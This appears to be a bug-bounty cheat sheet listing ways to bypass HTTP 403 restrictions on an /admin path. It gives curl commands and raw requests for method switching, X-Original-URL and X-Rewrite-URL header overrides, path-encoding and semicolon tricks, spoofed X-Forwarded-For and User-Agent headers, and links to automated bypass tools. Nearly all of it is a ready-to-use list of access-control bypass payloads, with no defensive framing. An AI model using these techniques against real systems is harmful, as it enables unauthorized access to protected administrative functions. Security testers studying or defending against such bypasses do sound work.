# 403 Bypass

## Manually Bypass

### Request Method Manipulation:

```http
# Original request
GET /admin HTTP/1.1
Host: target.com

# Modified request
POST /admin HTTP/1.1
Host: target.com

# Change Method to POST, HEAD, TRACE, PUT, OPTIONS
curl -X HEAD https://target.com/admin
```

### Bypassing via IP Address
```
# Sometimes, web applications restrict domain-based access but allow direct access via IP.

curl http://192.168.1.1/admin
```

### Bypassing via HTTP to HTTPS Switching

```
# Sometimes, servers have different rules for HTTP and HTTPS.
curl -k http://target.com/admin
curl -k https://target.com/admin
```

### Overriding the Target URL via Non-Standard Headers

```http
# Original request
GET /admin HTTP/1.1
Host: target.com

# Modified request
GET /anything HTTP/1.1
Host: target.com
X-Original-URL: /admin 

      # OR
GET /anything HTTP/1.1
Host: target.com
X-Rewrite-URL: /admin
```

### Appending %2e after the first slash

```http
# Original Request
https://target.com/admin => 403

# Modified Request
https://target.com/%2e/admin => 200
```


### Try add dot (.) slash (/) and semicolon (;) in the URL:

```http
# Original Request
https://target.com/admin => 403

# Modified Request
https://target.com/secret/. => 200
https://target.com//secret// => 200
https://target.com/./secret/.. => 200
https://target.com/;/secret => 200
https://target.com/.;/secret => 200
https://target.com//;//secret => 200
https://target.com/admin/%2e%2e/
https://target.com/admin%20/
```

### Add “..;/” after the directory name:

```http
# Original Request
https://target.com/admin

# Modified Request
https://target.com/admin..;/ 
```


### Try to uppercase the alphabet in the URL

```http
# Original Request
https://target.com/admin

# Modified Request
https://target.com/aDmIN

```

### Via Web Cache Poisoning:

```
GET /anything HTTP/1.1
Host: victim.com
X­-Original-­URL: /admin
```

### Modifying Headers
```
curl -H "X-Forwarded-For: 127.0.0.1" https://target.com/admin
curl -H "Referer: https://target.com/allowed-page" https://target.com/admin
curl -H "User-Agent: Googlebot" https://target.com/admin

# Try spoofing headers like X-Originating-IP, X-Real-IP, and X-Client-IP
```

## Automation Bypass


```bash
git clone https://github.com/yunemse48/403bypasser.git
pip install -r requirements.txt
python3 403bypasser.py -u https://target.com -d /admin
```

https://github.com/iamj0ker/bypass-403.git



















